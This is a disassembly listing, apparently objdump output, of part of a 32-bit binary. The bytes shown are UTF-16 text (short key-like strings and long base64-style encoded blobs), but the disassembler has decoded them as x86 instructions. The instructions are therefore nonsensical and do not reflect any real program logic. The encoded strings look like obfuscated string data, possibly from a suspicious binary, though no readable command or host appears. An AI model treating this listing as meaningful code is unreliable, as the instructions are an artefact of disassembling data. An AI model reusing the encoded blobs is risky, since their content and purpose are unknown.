10003c10:	34 00                	xor    $0x0,%al
10003c12:	4e                   	dec    %esi
10003c13:	00 6a 00             	add    %ch,0x0(%edx)
10003c16:	68 00 78 00 4e       	push   $0x4e007800
10003c1b:	00 6b 00             	add    %ch,0x0(%ebx)
10003c1e:	70 00                	jo     0x10003c20
10003c20:	54                   	push   %esp
10003c21:	00 55 00             	add    %dl,0x0(%ebp)
10003c24:	30 00                	xor    %al,(%eax)
10003c26:	35 00 73 00 59       	xor    $0x59007300,%eax
10003c2b:	00 30                	add    %dh,(%eax)
10003c2d:	00 4a 00             	add    %cl,0x0(%edx)
10003c30:	6c                   	insb   (%dx),%es:(%edi)
10003c31:	00 4f 00             	add    %cl,0x0(%edi)
10003c34:	44                   	inc    %esp
10003c35:	00 59 00             	add    %bl,0x0(%ecx)
10003c38:	34 00                	xor    $0x0,%al
10003c3a:	63 00                	arpl   %eax,(%eax)
10003c3c:	54                   	push   %esp
10003c3d:	00 5a 00             	add    %bl,0x0(%edx)
10003c40:	4b                   	dec    %ebx
10003c41:	00 55 00             	add    %dl,0x0(%ebp)
10003c44:	31 00                	xor    %eax,(%eax)
10003c46:	4e                   	dec    %esi
10003c47:	00 43 00             	add    %al,0x0(%ebx)
10003c4a:	5a                   	pop    %edx
10003c4b:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003c4f:	00 32                	add    %dh,(%edx)
10003c51:	00 4f 00             	add    %cl,0x0(%edi)
10003c54:	48                   	dec    %eax
10003c55:	00 45 00             	add    %al,0x0(%ebp)
10003c58:	32 00                	xor    (%eax),%al
10003c5a:	53                   	push   %ebx
10003c5b:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003c5f:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
10003c63:	00 30                	add    %dh,(%eax)
10003c65:	00 31                	add    %dh,(%ecx)
10003c67:	00 6e 00             	add    %ch,0x0(%esi)
10003c6a:	51                   	push   %ecx
10003c6b:	00 6d 00             	add    %ch,0x0(%ebp)
10003c6e:	55                   	push   %ebp
10003c6f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003c72:	4e                   	dec    %esi
10003c73:	00 6a 00             	add    %ch,0x0(%edx)
10003c76:	68 00 78 00 4e       	push   $0x4e007800
10003c7b:	00 6b 00             	add    %ch,0x0(%ebx)
10003c7e:	70 00                	jo     0x10003c80
10003c80:	54                   	push   %esp
10003c81:	00 55 00             	add    %dl,0x0(%ebp)
10003c84:	30 00                	xor    %al,(%eax)
10003c86:	4a                   	dec    %edx
10003c87:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003c8b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003c8f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003c92:	63 00                	arpl   %eax,(%eax)
10003c94:	54                   	push   %esp
10003c95:	00 5a 00             	add    %bl,0x0(%edx)
10003c98:	4b                   	dec    %ebx
10003c99:	00 55 00             	add    %dl,0x0(%ebp)
10003c9c:	31 00                	xor    %eax,(%eax)
10003c9e:	4e                   	dec    %esi
10003c9f:	00 69 00             	add    %ch,0x0(%ecx)
10003ca2:	56                   	push   %esi
10003ca3:	00 31                	add    %dh,(%ecx)
10003ca5:	00 5a 00             	add    %bl,0x0(%edx)
10003ca8:	43                   	inc    %ebx
10003ca9:	00 5a 00             	add    %bl,0x0(%edx)
10003cac:	54                   	push   %esp
10003cad:	00 67 00             	add    %ah,0x0(%edi)
10003cb0:	32 00                	xor    (%eax),%al
10003cb2:	4f                   	dec    %edi
10003cb3:	00 48 00             	add    %cl,0x0(%eax)
10003cb6:	45                   	inc    %ebp
10003cb7:	00 32                	add    %dh,(%edx)
10003cb9:	00 53 00             	add    %dl,0x0(%ebx)
10003cbc:	6c                   	insb   (%dx),%es:(%edi)
10003cbd:	00 4e 00             	add    %cl,0x0(%esi)
10003cc0:	54                   	push   %esp
10003cc1:	00 51 00             	add    %dl,0x0(%ecx)
10003cc4:	6d                   	insl   (%dx),%es:(%edi)
10003cc5:	00 55 00             	add    %dl,0x0(%ebp)
10003cc8:	34 00                	xor    $0x0,%al
10003cca:	4e                   	dec    %esi
10003ccb:	00 6a 00             	add    %ch,0x0(%edx)
10003cce:	68 00 78 00 4e       	push   $0x4e007800
10003cd3:	00 6b 00             	add    %ch,0x0(%ebx)
10003cd6:	70 00                	jo     0x10003cd8
10003cd8:	54                   	push   %esp
10003cd9:	00 55 00             	add    %dl,0x0(%ebp)
10003cdc:	33 00                	xor    (%eax),%eax
10003cde:	52                   	push   %edx
10003cdf:	00 69 00             	add    %ch,0x0(%ecx)
10003ce2:	4d                   	dec    %ebp
10003ce3:	00 30                	add    %dh,(%eax)
10003ce5:	00 4a 00             	add    %cl,0x0(%edx)
10003ce8:	6c                   	insb   (%dx),%es:(%edi)
10003ce9:	00 4f 00             	add    %cl,0x0(%edi)
10003cec:	44                   	inc    %esp
10003ced:	00 59 00             	add    %bl,0x0(%ecx)
10003cf0:	34 00                	xor    $0x0,%al
10003cf2:	63 00                	arpl   %eax,(%eax)
10003cf4:	54                   	push   %esp
10003cf5:	00 5a 00             	add    %bl,0x0(%edx)
10003cf8:	4b                   	dec    %ebx
10003cf9:	00 55 00             	add    %dl,0x0(%ebp)
10003cfc:	31 00                	xor    %eax,(%eax)
10003cfe:	4e                   	dec    %esi
10003cff:	00 43 00             	add    %al,0x0(%ebx)
10003d02:	5a                   	pop    %edx
10003d03:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003d07:	00 32                	add    %dh,(%edx)
10003d09:	00 4f 00             	add    %cl,0x0(%edi)
10003d0c:	48                   	dec    %eax
10003d0d:	00 45 00             	add    %al,0x0(%ebp)
10003d10:	32 00                	xor    (%eax),%al
10003d12:	53                   	push   %ebx
10003d13:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003d17:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
10003d1b:	00 6a 00             	add    %ch,0x0(%edx)
10003d1e:	56                   	push   %esi
10003d1f:	00 43 00             	add    %al,0x0(%ebx)
10003d22:	5a                   	pop    %edx
10003d23:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003d27:	00 32                	add    %dh,(%edx)
10003d29:	00 4f 00             	add    %cl,0x0(%edi)
10003d2c:	48                   	dec    %eax
10003d2d:	00 45 00             	add    %al,0x0(%ebp)
10003d30:	32 00                	xor    (%eax),%al
10003d32:	53                   	push   %ebx
10003d33:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003d37:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
10003d3b:	15 42 00 65 00       	adc    $0x650042,%eax
10003d40:	38 00                	cmp    %al,(%eax)
10003d42:	36 00 38             	add    %bh,%ss:(%eax)
10003d45:	00 71 00             	add    %dh,0x0(%ecx)
10003d48:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
10003d4c:	53                   	push   %ebx
10003d4d:	00 53 00             	add    %dl,0x0(%ebx)
10003d50:	00 81 b1 53 00 46    	add    %al,0x460053b1(%ecx)
10003d56:	00 46 00             	add    %al,0x0(%esi)
10003d59:	54                   	push   %esp
10003d5a:	00 63 00             	add    %ah,0x0(%ebx)
10003d5d:	6d                   	insl   (%dx),%es:(%edi)
10003d5e:	00 52 00             	add    %dl,0x0(%edx)
10003d61:	4f                   	dec    %edi
10003d62:	00 61 00             	add    %ah,0x0(%ecx)
10003d65:	6d                   	insl   (%dx),%es:(%edi)
10003d66:	00 51 00             	add    %dl,0x0(%ecx)
10003d69:	35 00 62 00 31       	xor    $0x31006200,%eax
10003d6e:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003d72:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10003d76:	00 68 00             	add    %ch,0x0(%eax)
10003d79:	52                   	push   %edx
10003d7a:	00 55 00             	add    %dl,0x0(%ebp)
10003d7d:	33 00                	xor    (%eax),%eax
10003d7f:	4a                   	dec    %edx
10003d80:	00 6b 00             	add    %ch,0x0(%ebx)
10003d83:	54                   	push   %esp
10003d84:	00 6d 00             	add    %ch,0x0(%ebp)
10003d87:	70 00                	jo     0x10003d89
10003d89:	6b 00 4f             	imul   $0x4f,(%eax),%eax
10003d8c:	00 57 00             	add    %dl,0x0(%edi)
10003d8f:	39 00                	cmp    %eax,(%eax)
10003d91:	49                   	dec    %ecx
10003d92:	00 55 00             	add    %dl,0x0(%ebp)
10003d95:	56                   	push   %esi
10003d96:	00 4e 00             	add    %cl,0x0(%esi)
10003d99:	79 00                	jns    0x10003d9b
10003d9b:	5a                   	pop    %edx
10003d9c:	00 45 00             	add    %al,0x0(%ebp)
10003d9f:	35 00 71 00 5a       	xor    $0x5a007100,%eax
10003da4:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003da8:	00 76 00             	add    %dh,0x0(%esi)
10003dab:	64 00 32             	add    %dh,%fs:(%edx)
10003dae:	00 4a 00             	add    %cl,0x0(%edx)
10003db1:	74 00                	je     0x10003db3
10003db3:	53                   	push   %ebx
10003db4:	00 46 00             	add    %al,0x0(%esi)
10003db7:	46                   	inc    %esi
10003db8:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10003dbc:	00 6d 00             	add    %ch,0x0(%ebp)
10003dbf:	52                   	push   %edx
10003dc0:	00 4f 00             	add    %cl,0x0(%edi)
10003dc3:	61                   	popa
10003dc4:	00 6d 00             	add    %ch,0x0(%ebp)
10003dc7:	51                   	push   %ecx
10003dc8:	00 35 00 62 00 30    	add    %dh,0x30006200
10003dce:	00 68 00             	add    %ch,0x0(%eax)
10003dd1:	52                   	push   %edx
10003dd2:	00 55 00             	add    %dl,0x0(%ebp)
10003dd5:	33 00                	xor    (%eax),%eax
10003dd7:	4a                   	dec    %edx
10003dd8:	00 6b 00             	add    %ch,0x0(%ebx)
10003ddb:	54                   	push   %esp
10003ddc:	00 6d 00             	add    %ch,0x0(%ebp)
10003ddf:	70 00                	jo     0x10003de1
10003de1:	6b 00 4f             	imul   $0x4f,(%eax),%eax
10003de4:	00 57 00             	add    %dl,0x0(%edi)
10003de7:	39 00                	cmp    %eax,(%eax)
10003de9:	57                   	push   %edi
10003dea:	00 4d 00             	add    %cl,0x0(%ebp)
10003ded:	46                   	inc    %esi
10003dee:	00 68 00             	add    %ch,0x0(%eax)
10003df1:	49                   	dec    %ecx
10003df2:	00 55 00             	add    %dl,0x0(%ebp)
10003df5:	56                   	push   %esi
10003df6:	00 4e 00             	add    %cl,0x0(%esi)
10003df9:	79 00                	jns    0x10003dfb
10003dfb:	5a                   	pop    %edx
10003dfc:	00 45 00             	add    %al,0x0(%ebp)
10003dff:	35 00 71 00 5a       	xor    $0x5a007100,%eax
10003e04:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003e08:	00 76 00             	add    %dh,0x0(%esi)
10003e0b:	53                   	push   %ebx
10003e0c:	00 46 00             	add    %al,0x0(%esi)
10003e0f:	46                   	inc    %esi
10003e10:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10003e14:	00 6d 00             	add    %ch,0x0(%ebp)
10003e17:	52                   	push   %edx
10003e18:	00 4f 00             	add    %cl,0x0(%edi)
10003e1b:	61                   	popa
10003e1c:	00 6d 00             	add    %ch,0x0(%ebp)
10003e1f:	51                   	push   %ecx
10003e20:	00 35 00 62 00 7a    	add    %dh,0x7a006200
10003e26:	00 4e 00             	add    %cl,0x0(%esi)
10003e29:	4b                   	dec    %ebx
10003e2a:	00 62 00             	add    %ah,0x0(%edx)
10003e2d:	45                   	inc    %ebp
10003e2e:	00 68 00             	add    %ch,0x0(%eax)
10003e31:	52                   	push   %edx
10003e32:	00 55 00             	add    %dl,0x0(%ebp)
10003e35:	33 00                	xor    (%eax),%eax
10003e37:	4a                   	dec    %edx
10003e38:	00 6b 00             	add    %ch,0x0(%ebx)
10003e3b:	54                   	push   %esp
10003e3c:	00 6d 00             	add    %ch,0x0(%ebp)
10003e3f:	70 00                	jo     0x10003e41
10003e41:	6b 00 4f             	imul   $0x4f,(%eax),%eax
10003e44:	00 57 00             	add    %dl,0x0(%edi)
10003e47:	39 00                	cmp    %eax,(%eax)
10003e49:	49                   	dec    %ecx
10003e4a:	00 55 00             	add    %dl,0x0(%ebp)
10003e4d:	56                   	push   %esi
10003e4e:	00 4e 00             	add    %cl,0x0(%esi)
10003e51:	79 00                	jns    0x10003e53
10003e53:	5a                   	pop    %edx
10003e54:	00 45 00             	add    %al,0x0(%ebp)
10003e57:	35 00 71 00 5a       	xor    $0x5a007100,%eax
10003e5c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003e60:	00 76 00             	add    %dh,0x0(%esi)
10003e63:	57                   	push   %edi
10003e64:	00 6a 00             	add    %ch,0x0(%edx)
10003e67:	4e                   	dec    %esi
10003e68:	00 4f 00             	add    %cl,0x0(%edi)
10003e6b:	53                   	push   %ebx
10003e6c:	00 46 00             	add    %al,0x0(%esi)
10003e6f:	46                   	inc    %esi
10003e70:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10003e74:	00 6d 00             	add    %ch,0x0(%ebp)
10003e77:	52                   	push   %edx
10003e78:	00 4f 00             	add    %cl,0x0(%edi)
10003e7b:	61                   	popa
10003e7c:	00 6d 00             	add    %ch,0x0(%ebp)
10003e7f:	51                   	push   %ecx
10003e80:	00 35 00 62 00 30    	add    %dh,0x30006200
10003e86:	00 68 00             	add    %ch,0x0(%eax)
10003e89:	52                   	push   %edx
10003e8a:	00 55 00             	add    %dl,0x0(%ebp)
10003e8d:	33 00                	xor    (%eax),%eax
10003e8f:	4a                   	dec    %edx
10003e90:	00 6b 00             	add    %ch,0x0(%ebx)
10003e93:	54                   	push   %esp
10003e94:	00 6d 00             	add    %ch,0x0(%ebp)
10003e97:	70 00                	jo     0x10003e99
10003e99:	6b 00 4f             	imul   $0x4f,(%eax),%eax
10003e9c:	00 57 00             	add    %dl,0x0(%edi)
10003e9f:	39 00                	cmp    %eax,(%eax)
10003ea1:	34 00                	xor    $0x0,%al
10003ea3:	59                   	pop    %ecx
10003ea4:	00 6b 00             	add    %ch,0x0(%ebx)
10003ea7:	46                   	inc    %esi
10003ea8:	00 49 00             	add    %cl,0x0(%ecx)
10003eab:	55                   	push   %ebp
10003eac:	00 56 00             	add    %dl,0x0(%esi)
10003eaf:	4e                   	dec    %esi
10003eb0:	00 79 00             	add    %bh,0x0(%ecx)
10003eb3:	5a                   	pop    %edx
10003eb4:	00 45 00             	add    %al,0x0(%ebp)
10003eb7:	35 00 71 00 5a       	xor    $0x5a007100,%eax
10003ebc:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003ec0:	00 76 00             	add    %dh,0x0(%esi)
10003ec3:	53                   	push   %ebx
10003ec4:	00 46 00             	add    %al,0x0(%esi)
10003ec7:	46                   	inc    %esi
10003ec8:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10003ecc:	00 6d 00             	add    %ch,0x0(%ebp)
10003ecf:	52                   	push   %edx
10003ed0:	00 4f 00             	add    %cl,0x0(%edi)
10003ed3:	61                   	popa
10003ed4:	00 6d 00             	add    %ch,0x0(%ebp)
10003ed7:	51                   	push   %ecx
10003ed8:	00 35 00 62 00 7a    	add    %dh,0x7a006200
10003ede:	00 30                	add    %dh,(%eax)
10003ee0:	00 39                	add    %bh,(%ecx)
10003ee2:	00 53 00             	add    %dl,0x0(%ebx)
10003ee5:	46                   	inc    %esi
10003ee6:	00 46 00             	add    %al,0x0(%esi)
10003ee9:	54                   	push   %esp
10003eea:	00 63 00             	add    %ah,0x0(%ebx)
10003eed:	6d                   	insl   (%dx),%es:(%edi)
10003eee:	00 52 00             	add    %dl,0x0(%edx)
10003ef1:	4f                   	dec    %edi
10003ef2:	00 61 00             	add    %ah,0x0(%ecx)
10003ef5:	6d                   	insl   (%dx),%es:(%edi)
10003ef6:	00 51 00             	add    %dl,0x0(%ecx)
10003ef9:	35 00 62 00 77       	xor    $0x77006200,%eax
10003efe:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003f04:	15 48 00 51 00       	adc    $0x510048,%eax
10003f09:	53                   	push   %ebx
10003f0a:	00 72 00             	add    %dh,0x0(%edx)
10003f0d:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003f11:	6a 00                	push   $0x0
10003f13:	64 00 39             	add    %bh,%fs:(%ecx)
10003f16:	00 6f 00             	add    %ch,0x0(%edi)
10003f19:	00 81 b1 57 00 54    	add    %al,0x540057b1(%ecx)
10003f1f:	00 4a 00             	add    %cl,0x0(%edx)
10003f22:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
10003f26:	6b 00 64             	imul   $0x64,(%eax),%eax
10003f29:	00 42 00             	add    %al,0x0(%edx)
10003f2c:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
10003f31:	00 79 00             	add    %bh,0x0(%ecx)
10003f34:	59                   	pop    %ecx
10003f35:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003f39:	00 59 00             	add    %bl,0x0(%ecx)
10003f3c:	54                   	push   %esp
10003f3d:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10003f41:	00 79 00             	add    %bh,0x0(%ecx)
10003f44:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10003f48:	70 00                	jo     0x10003f4a
10003f4a:	48                   	dec    %eax
10003f4b:	00 51 00             	add    %dl,0x0(%ecx)
10003f4e:	58                   	pop    %eax
10003f4f:	00 55 00             	add    %dl,0x0(%ebp)
10003f52:	35 00 63 00 6d       	xor    $0x6d006300,%eax
10003f57:	00 4a 00             	add    %cl,0x0(%edx)
10003f5a:	5a                   	pop    %edx
10003f5b:	00 4d 00             	add    %cl,0x0(%ebp)
10003f5e:	6e                   	outsb  %ds:(%esi),(%dx)
10003f5f:	00 70 00             	add    %dh,0x0(%eax)
10003f62:	4b                   	dec    %ebx
10003f63:	00 52 00             	add    %dl,0x0(%edx)
10003f66:	30 00                	xor    %al,(%eax)
10003f68:	46                   	inc    %esi
10003f69:	00 31                	add    %dh,(%ecx)
10003f6b:	00 4f 00             	add    %cl,0x0(%edi)
10003f6e:	58                   	pop    %eax
10003f6f:	00 4a 00             	add    %cl,0x0(%edx)
10003f72:	69 00 64 00 32 00    	imul   $0x320064,(%eax),%eax
10003f78:	4a                   	dec    %edx
10003f79:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
10003f7d:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003f81:	00 36                	add    %dh,(%esi)
10003f83:	00 53 00             	add    %dl,0x0(%ebx)
10003f86:	6b 00 64             	imul   $0x64,(%eax),%eax
10003f89:	00 42 00             	add    %al,0x0(%edx)
10003f8c:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
10003f91:	00 79 00             	add    %bh,0x0(%ecx)
10003f94:	59                   	pop    %ecx
10003f95:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10003f99:	00 79 00             	add    %bh,0x0(%ecx)
10003f9c:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10003fa0:	70 00                	jo     0x10003fa2
10003fa2:	48                   	dec    %eax
10003fa3:	00 51 00             	add    %dl,0x0(%ecx)
10003fa6:	58                   	pop    %eax
10003fa7:	00 55 00             	add    %dl,0x0(%ebp)
10003faa:	35 00 63 00 6d       	xor    $0x6d006300,%eax
10003faf:	00 4a 00             	add    %cl,0x0(%edx)
10003fb2:	57                   	push   %edi
10003fb3:	00 4d 00             	add    %cl,0x0(%ebp)
10003fb6:	46                   	inc    %esi
10003fb7:	00 68 00             	add    %ch,0x0(%eax)
10003fba:	5a                   	pop    %edx
10003fbb:	00 4d 00             	add    %cl,0x0(%ebp)
10003fbe:	6e                   	outsb  %ds:(%esi),(%dx)
10003fbf:	00 70 00             	add    %dh,0x0(%eax)
10003fc2:	4b                   	dec    %ebx
10003fc3:	00 52 00             	add    %dl,0x0(%edx)
10003fc6:	30 00                	xor    %al,(%eax)
10003fc8:	46                   	inc    %esi
10003fc9:	00 31                	add    %dh,(%ecx)
10003fcb:	00 4f 00             	add    %cl,0x0(%edi)
10003fce:	58                   	pop    %eax
10003fcf:	00 4a 00             	add    %cl,0x0(%edx)
10003fd2:	69 00 57 00 54 00    	imul   $0x540057,(%eax),%eax
10003fd8:	4a                   	dec    %edx
10003fd9:	00 36                	add    %dh,(%esi)
10003fdb:	00 53 00             	add    %dl,0x0(%ebx)
10003fde:	6b 00 64             	imul   $0x64,(%eax),%eax
10003fe1:	00 42 00             	add    %al,0x0(%edx)
10003fe4:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
10003fe9:	00 79 00             	add    %bh,0x0(%ecx)
10003fec:	59                   	pop    %ecx
10003fed:	00 6a 00             	add    %ch,0x0(%edx)
10003ff0:	4a                   	dec    %edx
10003ff1:	00 4f 00             	add    %cl,0x0(%edi)
10003ff4:	64 00 6c 00 6b       	add    %ch,%fs:0x6b(%eax,%eax,1)
10003ff9:	00 79 00             	add    %bh,0x0(%ecx)
10003ffc:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004000:	70 00                	jo     0x10004002
10004002:	48                   	dec    %eax
10004003:	00 51 00             	add    %dl,0x0(%ecx)
10004006:	58                   	pop    %eax
10004007:	00 55 00             	add    %dl,0x0(%ebp)
1000400a:	35 00 63 00 6d       	xor    $0x6d006300,%eax
1000400f:	00 4a 00             	add    %cl,0x0(%edx)
10004012:	5a                   	pop    %edx
10004013:	00 4d 00             	add    %cl,0x0(%ebp)
10004016:	6e                   	outsb  %ds:(%esi),(%dx)
10004017:	00 70 00             	add    %dh,0x0(%eax)
1000401a:	4b                   	dec    %ebx
1000401b:	00 52 00             	add    %dl,0x0(%edx)
1000401e:	30 00                	xor    %al,(%eax)
10004020:	46                   	inc    %esi
10004021:	00 31                	add    %dh,(%ecx)
10004023:	00 4f 00             	add    %cl,0x0(%edi)
10004026:	58                   	pop    %eax
10004027:	00 4a 00             	add    %cl,0x0(%edx)
1000402a:	69 00 59 00 6c 00    	imul   $0x6c0059,(%eax),%eax
10004030:	68 00 43 00 57       	push   $0x57004300
10004035:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10004039:	00 36                	add    %dh,(%esi)
1000403b:	00 53 00             	add    %dl,0x0(%ebx)
1000403e:	6b 00 64             	imul   $0x64,(%eax),%eax
10004041:	00 42 00             	add    %al,0x0(%edx)
10004044:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
10004049:	00 79 00             	add    %bh,0x0(%ecx)
1000404c:	59                   	pop    %ecx
1000404d:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10004051:	00 79 00             	add    %bh,0x0(%ecx)
10004054:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004058:	70 00                	jo     0x1000405a
1000405a:	48                   	dec    %eax
1000405b:	00 51 00             	add    %dl,0x0(%ecx)
1000405e:	58                   	pop    %eax
1000405f:	00 55 00             	add    %dl,0x0(%ebp)
10004062:	35 00 63 00 6d       	xor    $0x6d006300,%eax
10004067:	00 4a 00             	add    %cl,0x0(%edx)
1000406a:	77 00                	ja     0x1000406c
1000406c:	59                   	pop    %ecx
1000406d:	00 6b 00             	add    %ch,0x0(%ebx)
10004070:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
10004074:	4d                   	dec    %ebp
10004075:	00 6e 00             	add    %ch,0x0(%esi)
10004078:	70 00                	jo     0x1000407a
1000407a:	4b                   	dec    %ebx
1000407b:	00 52 00             	add    %dl,0x0(%edx)
1000407e:	30 00                	xor    %al,(%eax)
10004080:	46                   	inc    %esi
10004081:	00 31                	add    %dh,(%ecx)
10004083:	00 4f 00             	add    %cl,0x0(%edi)
10004086:	58                   	pop    %eax
10004087:	00 4a 00             	add    %cl,0x0(%edx)
1000408a:	69 00 57 00 54 00    	imul   $0x540057,(%eax),%eax
10004090:	4a                   	dec    %edx
10004091:	00 36                	add    %dh,(%esi)
10004093:	00 53 00             	add    %dl,0x0(%ebx)
10004096:	6b 00 64             	imul   $0x64,(%eax),%eax
10004099:	00 42 00             	add    %al,0x0(%edx)
1000409c:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
100040a1:	00 79 00             	add    %bh,0x0(%ecx)
100040a4:	59                   	pop    %ecx
100040a5:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
100040a9:	00 35 00 57 00 54    	add    %dh,0x54005700
100040af:	00 4a 00             	add    %cl,0x0(%edx)
100040b2:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
100040b6:	6b 00 64             	imul   $0x64,(%eax),%eax
100040b9:	00 42 00             	add    %al,0x0(%edx)
100040bc:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
100040c1:	00 79 00             	add    %bh,0x0(%ecx)
100040c4:	59                   	pop    %ecx
100040c5:	00 67 00             	add    %ah,0x0(%edi)
100040c8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100040cd:	15 59 00 32 00       	adc    $0x320059,%eax
100040d2:	7a 00                	jp     0x100040d4
100040d4:	4a                   	dec    %edx
100040d5:	00 47 00             	add    %al,0x0(%edi)
100040d8:	41                   	inc    %ecx
100040d9:	00 75 00             	add    %dh,0x0(%ebp)
100040dc:	39 00                	cmp    %eax,(%eax)
100040de:	72 00                	jb     0x100040e0
100040e0:	62 00                	bound  %eax,(%eax)
100040e2:	00 80 b9 64 00 32    	add    %al,0x320064b9(%eax)
100040e8:	00 4a 00             	add    %cl,0x0(%edx)
100040eb:	73 00                	jae    0x100040ed
100040ed:	55                   	push   %ebp
100040ee:	00 7a 00             	add    %bh,0x0(%edx)
100040f1:	6c                   	insb   (%dx),%es:(%edi)
100040f2:	00 6a 00             	add    %ch,0x0(%edx)
100040f5:	57                   	push   %edi
100040f6:	00 6e 00             	add    %ch,0x0(%esi)
100040f9:	70 00                	jo     0x100040fb
100040fb:	4c                   	dec    %esp
100040fc:	00 57 00             	add    %dl,0x0(%edi)
100040ff:	6c                   	insb   (%dx),%es:(%edi)
10004100:	00 56 00             	add    %dl,0x0(%esi)
10004103:	74 00                	je     0x10004105
10004105:	56                   	push   %esi
10004106:	00 6e 00             	add    %ch,0x0(%esi)
10004109:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
1000410d:	62 00                	bound  %eax,(%eax)
1000410f:	46                   	inc    %esi
10004110:	00 4d 00             	add    %cl,0x0(%ebp)
10004113:	35 00 59 00 31       	xor    $0x31005900,%eax
10004118:	00 70 00             	add    %dh,0x0(%eax)
1000411b:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
1000411f:	31 00                	xor    %eax,(%eax)
10004121:	70 00                	jo     0x10004123
10004123:	33 00                	xor    (%eax),%eax
10004125:	59                   	pop    %ecx
10004126:	00 6d 00             	add    %ch,0x0(%ebp)
10004129:	78 00                	js     0x1000412b
1000412b:	54                   	push   %esp
1000412c:	00 4f 00             	add    %cl,0x0(%edi)
1000412f:	57                   	push   %edi
10004130:	00 4e 00             	add    %cl,0x0(%esi)
10004133:	61                   	popa
10004134:	00 65 00             	add    %ah,0x0(%ebp)
10004137:	6b 00 74             	imul   $0x74,(%eax),%eax
1000413a:	00 61 00             	add    %ah,0x0(%ecx)
1000413d:	62 00                	bound  %eax,(%eax)
1000413f:	6c                   	insb   (%dx),%es:(%edi)
10004140:	00 46 00             	add    %al,0x0(%esi)
10004143:	59                   	pop    %ecx
10004144:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
10004148:	00 4a 00             	add    %cl,0x0(%edx)
1000414b:	73 00                	jae    0x1000414d
1000414d:	55                   	push   %ebp
1000414e:	00 7a 00             	add    %bh,0x0(%edx)
10004151:	6c                   	insb   (%dx),%es:(%edi)
10004152:	00 6a 00             	add    %ch,0x0(%edx)
10004155:	57                   	push   %edi
10004156:	00 6e 00             	add    %ch,0x0(%esi)
10004159:	70 00                	jo     0x1000415b
1000415b:	4c                   	dec    %esp
1000415c:	00 57 00             	add    %dl,0x0(%edi)
1000415f:	6e                   	outsb  %ds:(%esi),(%dx)
10004160:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
10004164:	00 62 00             	add    %ah,0x0(%edx)
10004167:	46                   	inc    %esi
10004168:	00 4d 00             	add    %cl,0x0(%ebp)
1000416b:	35 00 59 00 31       	xor    $0x31005900,%eax
10004170:	00 70 00             	add    %dh,0x0(%eax)
10004173:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
10004177:	31 00                	xor    %eax,(%eax)
10004179:	70 00                	jo     0x1000417b
1000417b:	4f                   	dec    %edi
1000417c:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10004180:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
10004184:	00 62 00             	add    %ah,0x0(%edx)
10004187:	46                   	inc    %esi
10004188:	00 4d 00             	add    %cl,0x0(%ebp)
1000418b:	35 00 59 00 31       	xor    $0x31005900,%eax
10004190:	00 70 00             	add    %dh,0x0(%eax)
10004193:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
10004197:	31 00                	xor    %eax,(%eax)
10004199:	6f                   	outsl  %ds:(%esi),(%dx)
1000419a:	00 3d 00 00 15 77    	add    %bh,0x77150000
100041a0:	00 62 00             	add    %ah,0x0(%edx)
100041a3:	6c                   	insb   (%dx),%es:(%edi)
100041a4:	00 53 00             	add    %dl,0x0(%ebx)
100041a7:	39 00                	cmp    %eax,(%eax)
100041a9:	63 00                	arpl   %eax,(%eax)
100041ab:	5a                   	pop    %edx
100041ac:	00 7a 00             	add    %bh,0x0(%edx)
100041af:	4b                   	dec    %ebx
